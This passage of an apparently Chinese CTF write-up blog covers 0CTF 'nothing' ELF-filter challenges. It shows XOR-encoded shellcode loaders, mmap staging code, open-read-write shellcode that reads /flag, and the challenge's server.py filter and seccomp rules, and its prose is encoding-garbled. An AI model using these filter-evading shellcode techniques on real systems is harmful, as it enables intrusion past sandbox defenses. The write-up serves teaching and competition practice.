class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs assembly">global    _start<br>section   .text<br><br>_start:<br>    sub rsp,0x100<br>xor_shellcode_mmap_l1:<br>    xor    eax,eax<br>    lea    rdi,[sc_mmap]<br>    mov    rsi,rsp<br>    mov    rdx,QWORD [scm_len]<br>xor_shellcode_mmap_l2:<br>    cmp    rdx,rax<br>    je     jump_to_shellcode<br>    mov    cl,BYTE [rdi+rax*1]<br>    xor    ecx,0x1<br>    mov    BYTE [rsi+rax*1],cl<br>    inc    rax<br>    jmp    xor_shellcode_mmap_l2<br><br>jump_to_shellcode:<br>    jmp rsp<br><br>; message:  db        &quot;test output!!!!!&quot;, 0      ; note the newline at the end<br>sc:    db        185, 4, 1, 1, 1, 73, 191, 46, 103, 109, 96, 102, 1, 1, 1, 87, 136, 226, 48, 200, 204, 129, 48, 193, 190, 2, 1, 1, 1, 191, 1, 9, 39, 24, 187, 1, 0, 1, 1, 14, 4, 185, 0, 1, 1, 65, 190, 0, 1, 1, 1, 191, 1, 9, 39, 24, 187, 1, 0, 1, 1, 14, 4, 185, 0, 1, 1, 1, 186, 136, 1, 1, 1, 204, 129, 1, 47, 114, 105, 114, 117<br>sc_len:     dq        81<br>sc_mmap:    db        185, 8, 1, 1, 65, 190, 1, 241, 36, 24, 191, 1, 33, 1, 1, 187, 6, 1, 1, 1, 64, 187, 35, 1, 1, 1, 64, 185, 1, 1, 1, 1, 64, 184, 1, 1, 1, 1, 14, 4, 185, 8, 1, 1, 65, 190, 1, 1, 40, 24, 191, 1, 33, 1, 1, 187, 6, 1, 1, 1, 64, 187, 35, 1, 1, 1, 64, 185, 1, 1, 1, 1, 64, 184, 1, 1, 1, 1, 14, 4, 48, 193, 73, 140, 61, 36, 48, 17, 65, 1, 191, 1, 1, 40, 24, 187, 75, 1, 1, 1, 73, 56, 195, 117, 15, 139, 13, 6, 130, 240, 0, 137, 13, 7, 73, 254, 193, 234, 236, 189, 1, 1, 39, 24, 185, 1, 1, 40, 24, 254, 225, 1, 1, 1, 1, 1, 1<br>scm_len:    dq        137<br></code></pre></td></tr></table></figure><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/jmprsp.png" class title="jmprsp"><p>é“¾æ¥å¸¦stackçš„elfä½¿ç”¨ä»¥ä¸‹å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ld -o exp -z execstack exp.o<br></code></pre></td></tr></table></figure><p>è¿™æ ·çš„stackæ˜¯rwxçš„ï¼Œéœ€è¦010editoræ”¹ä¸€ä¸‹æƒé™</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/editor.png" class title="editor"></li><li><p>shellcode2ï¼ˆsc_mmapï¼‰mmapä¸¤æ®µå†…å­˜ï¼Œå°†shellcode3ï¼ˆscï¼‰å¤åˆ¶è¿‡å»ï¼Œæ‰§è¡Œä¹‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .text<br>    global _start<br><br>_start:<br>mmap_32bit_stack:<br>    mov eax, 0x40000009<br>    mov edi, 0x19260000-0x1000<br>    mov esi, 0x2000<br>    mov edx, 7<br>    mov r10, 0x22<br>    mov r8, 0<br>    mov r9, 0<br>    syscall ; call syscall<br>    ; mmap_x32(0x19260000-0x1000, 0x2000, RWX, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0)<br>mmap_32bit_shellcode:<br>    mov eax, 0x40000009<br>    mov edi, 0x19290000<br>    mov esi, 0x2000<br>    mov edx, 7<br>    mov r10, 0x22<br>    mov r8, 0<br>    mov r9, 0<br>    syscall ; call syscall<br>    ; mmap_x32(0x19290000, 0x2000, RWX, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0)<br>xor_shellcode_l1:<br>    xor    eax,eax<br>    lea    rdi,0x401031<br>    mov    rsi,0x19290000<br>    mov    rdx,80<br>xor_shellcode_l2:<br>    cmp    rdx,rax<br>    je     jump_to_shellcode<br>    mov    cl,BYTE [rdi+rax*1]<br>    xor    ecx,0x1<br>    mov    BYTE [rsi+rax*1],cl<br>    inc    rax<br>    jmp    xor_shellcode_l2<br><br>jump_to_shellcode:<br>    mov rsp, 0x19260000<br>    mov rax, 0x19290000<br>    jmp rax<br></code></pre></td></tr></table></figure><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/jmpshellcode.png" class title="jmpshellcode"></li><li><p>shellcode3ï¼ˆscï¼‰è¿›è¡Œorw</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">section .text<br>    global _start<br><br>_start:<br>_open:<br>    mov eax, <span class="hljs-number">5</span><br>    mov rsi, <span class="hljs-number">0x0067616c662f</span><br>    push rsi ; /flag<br>    mov ebx, esp<br>    xor ecx, ecx<br>    <span class="hljs-type">int</span> <span class="hljs-number">0x80</span><br><br>_read:<br>    xor eax, eax<br>    mov rdi, <span class="hljs-number">3</span><br>    mov rsi, <span class="hljs-number">0x19260800</span><br>    mov rdx, <span class="hljs-number">0x100</span><br>    syscall<br><br>_write:<br>    mov rax, <span class="hljs-number">0x40000001</span><br>    mov rdi, <span class="hljs-number">1</span><br>    mov rsi, <span class="hljs-number">0x19260800</span><br>    mov rdx, <span class="hljs-number">0x100</span><br>    syscall<br><br>_exit:<br>    mov eax, <span class="hljs-number">1</span><br>    mov ebx, <span class="hljs-number">137</span><br>    <span class="hljs-type">int</span> <span class="hljs-number">0x80</span><br></code></pre></td></tr></table></figure><p><strong>psï¼švdsoçš„shellcodeå†™å…¥flagå­—ç¬¦ä¸²æ—¶æ˜¯ä¸¤ä¸ªpushï¼Œè¿™æ˜¯å·²ç»åˆ‡æ¢32ä½äº†ï¼Œä¸€æ¬¡pushæ˜¯å››å­—èŠ‚ï¼Œ64ä½pushä¸¤æ¬¡å°±å˜æˆ &#x2F;fla äº†(â•¯â€µâ–¡â€²)â•¯ï¸µâ”»â”â”»ï¼Œå°±è¿™ä¸ªbug deäº†å¥½ä¹…â€¦â€¦</strong></p></li></ul><h1 id="2023-0CTF-nothing"><a href="#2023-0CTF-nothing" class="headerlink" title="2023 0CTF nothing"></a>2023 0CTF nothing</h1><h2 id="server-py-1"><a href="#server-py-1" class="headerlink" title="server.py"></a>server.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3 -u</span><br><br><span class="hljs-keyword">import</span> os, sys, random, subprocess, gmpy2<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha3_256<br><span class="hljs-keyword">from</span> elftools.elf.elffile <span class="hljs-keyword">import</span> ELFFile<br><span class="hljs-keyword">from</span> elftools.elf.constants <span class="hljs-keyword">import</span> P_FLAGS<br><br>os.chdir(os.path.dirname(__file__))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">proof_of_work</span>(<span class="hljs-params">sec = <span class="hljs-number">10</span></span>):<br>    <span class="hljs-comment"># From 0CTF/TCTF 2021</span><br>    p = gmpy2.next_prime(random.getrandbits(<span class="hljs-number">512</span>))<br>    q = gmpy2.next_prime(random.getrandbits(<span class="hljs-number">512</span>))<br>    n = p*q<br>    c = <span class="hljs-number">2900000</span><br>    t = c*sec + random.randint(<span class="hljs-number">0</span>,c)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Show me your computation:&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;2^(2^<span class="hljs-subst">&#123;t&#125;</span>) mod <span class="hljs-subst">&#123;n&#125;</span> = ?&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your answer: &#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        sol = <span class="hljs-built_in">int</span>(sys.stdin.readline())<br>        phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>        u = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, t, phi)<br>        w = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, u, n)<br>        <span class="hljs-keyword">if</span> w == sol:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Correct!&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Wrong Answer!&#x27;</span>)<br>            exit()<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid Input!&#x27;</span>)<br>        exit()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_bytes</span>(<span class="hljs-params">data, b</span>):<br>    p = -<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p = data.find(b, p+<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> p == -<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">elif</span> p &amp; <span class="hljs-number">0xfff</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> p &amp; <span class="hljs-number">0xfff</span> == <span class="hljs-number">0xfff</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_segments</span>(<span class="hljs-params">elf</span>):<br>    <span class="hljs-keyword">for</span> seg <span class="hljs-keyword">in</span> elf.iter_segments():<br>        <span class="hljs-keyword">if</span> seg.header.p_filesz &gt; <span class="hljs-number">0x10000</span> <span class="hljs-keyword">or</span> seg.header.p_memsz &gt; <span class="hljs-number">0x10000</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Segment too large&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_INTERP&#x27;</span> <span class="hljs-keyword">or</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_DYNAMIC&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;No dynamic link&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_LOAD&#x27;</span> <span class="hljs-keyword">and</span> seg.header.p_flags &amp; P_FLAGS.PF_W <span class="hljs-keyword">and</span> seg.header.p_flags &amp; P_FLAGS.PF_X:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;W^X&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_GNU_STACK&#x27;</span> <span class="hljs-keyword">and</span> seg.header.p_flags &amp; P_FLAGS.PF_X:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;No executable stack&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_elf</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) &lt; <span class="hljs-number">0x40</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Incomplete ELF Header&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data.startswith(<span class="hljs-string">b&#x27;\x7fELF\x02\x01\x01&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">9</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid ELF Magic&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\xcd\x80&#x27;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;\x0f\x05&#x27;</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad Instruction&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\xcd&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x80&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x0f&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x05&#x27;</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad Instruction&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    elf = ELFFile(BytesIO(data))<br>    <span class="hljs-keyword">if</span> ((elf.header.e_type != <span class="hljs-string">&#x27;ET_EXEC&#x27;</span> <span class="hljs-keyword">and</span> elf.header.e_type != <span class="hljs-string">&#x27;ET_DYN&#x27;</span>)<br>        <span class="hljs-keyword">or</span> elf.header.e_version != <span class="hljs-string">&#x27;EV_CURRENT&#x27;</span><br>        <span class="hljs-keyword">or</span> elf.header.e_ehsize != <span class="hljs-number">0x40</span><br>        <span class="hljs-keyword">or</span> elf.header.e_phoff != <span class="hljs-number">0x40</span><br>        <span class="hljs-keyword">or</span> elf.header.e_phnum &lt;= <span class="hljs-number">0</span><br>        <span class="hljs-keyword">or</span> elf.header.e_phnum &gt;= <span class="hljs-number">100</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad ELF Header&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> check_segments(elf)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">try</span>:<br>        size = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Size of your ELF: &#x27;</span>))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid size!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> size &lt;= <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> size &gt; <span class="hljs-number">0x10000</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad size!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ELF File:&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        data = sys.stdin.buffer.read(size)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid file data&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) != size:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Incomplete file data&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Received: %d bytes&#x27;</span> % <span class="hljs-built_in">len</span>(data))<br>    <span class="hljs-keyword">if</span> check_elf(data):<br>        filename = sha3_256(data).hexdigest()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;File Hash: <span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span>)<br>        path = <span class="hljs-string">f&#x27;./data/<span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span><br>        <span class="hljs-keyword">if</span> os.path.exists(path):<br>            os.unlink(path)<br>        <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;wb&#x27;</span>).write(data)<br>        os.chmod(path, <span class="hljs-number">0o555</span>)<br>        <span class="hljs-keyword">try</span>:<br>            p = subprocess.Popen([<span class="hljs-string">&#x27;docker&#x27;</span>, <span class="hljs-string">&#x27;run&#x27;</span>, <span class="hljs-string">&#x27;-i&#x27;</span>, <span class="hljs-string">&#x27;--rm&#x27;</span>, <span class="hljs-string">&#x27;-v&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;path&#125;</span>:/chroot/<span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span>, <span class="hljs-string">&#x27;tctf/launcher64:2023&#x27;</span>, filename], stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)<br>            p.wait()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Return status: %d&#x27;</span> % p.returncode)<br>            <span class="hljs-keyword">if</span> p.returncode == <span class="hljs-number">137</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Output:&#x27;</span>)<br>                sys.stdout.buffer.write(p.stdout.read())<br>                <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Something went wrong!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> proof_of_work():<br>        main()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bye!&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>ä¸åŒï¼š</p><ul><li>ç¦æ­¢æ®µè¡¨é¡¹æ•°å¤§äº100</li><li>ç¦æ­¢GNU_STACKæ®µæœ‰xæƒé™</li></ul><h2 id="åˆ©ç”¨-1"><a href="#åˆ©ç”¨-1" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c">line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x1b</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) <span class="hljs-keyword">goto</span> <span class="hljs-number">0029</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x35</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x40000000</span>  <span class="hljs-keyword">if</span> (A &lt; <span class="hljs-number">0x40000000</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0005</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x22</span> <span class="hljs-number">0xffffffff</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0xffffffff</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == close) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x1f</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000000b</span>  <span class="hljs-keyword">if</span> (A == munmap) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x1e</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000000c</span>  <span class="hljs-keyword">if</span> (A == brk) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x1d</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000003c</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-built_in">exit</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x1c</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000e7</span>  <span class="hljs-keyword">if</span> (A == exit_group) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0010</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00000009</span>  <span class="hljs-keyword">if</span> (A != mmap) <span class="hljs-keyword">goto</span> <span class="hljs-number">0015</span><br> <span class="hljs-number">0011</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000024</span>  A = prot &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># mmap(addr, len, prot, flags, fd, pgoff)</span><br> <span class="hljs-number">0012</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x1a</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x0</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0013</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000020</span>  A = prot <span class="hljs-meta"># mmap(addr, len, prot, flags, fd, pgoff)</span><br> <span class="hljs-number">0014</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x17</span> <span class="hljs-number">0x18</span> <span class="hljs-number">0x00000002</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-number">0x2</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span> <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0015</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x0000003b</span>  <span class="hljs-keyword">if</span> (A != execve) <span class="hljs-keyword">goto</span> <span class="hljs-number">0020</span><br> <span class="hljs-number">0016</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000014</span>  A = filename &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># execve(filename, argv, envp)</span><br> <span class="hljs-number">0017</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x15</span> <span class="hljs-number">0x00007fff</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x7fff</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span 